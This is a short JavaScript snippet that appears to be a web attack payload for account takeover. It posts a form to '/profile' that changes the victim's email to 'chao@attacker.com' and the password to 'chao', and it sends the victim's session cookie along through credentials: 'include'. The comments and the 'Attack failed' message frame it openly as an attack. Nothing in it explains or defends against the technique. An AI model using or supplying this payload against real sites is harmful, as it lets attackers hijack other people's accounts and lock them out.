// Set new email and password
const formData = new FormData();
formData.append("email", "chao@attacker.com");
formData.append("password", "chao");

// post the data
fetch("/profile", {
  method: "POST",
  body: formData,
  credentials: "include" // Automatically includes the victim's session cookie
})
.then(response => {
  console.log(response.status);
})
.catch(err => {
  console.error("Attack failed:", err);
});
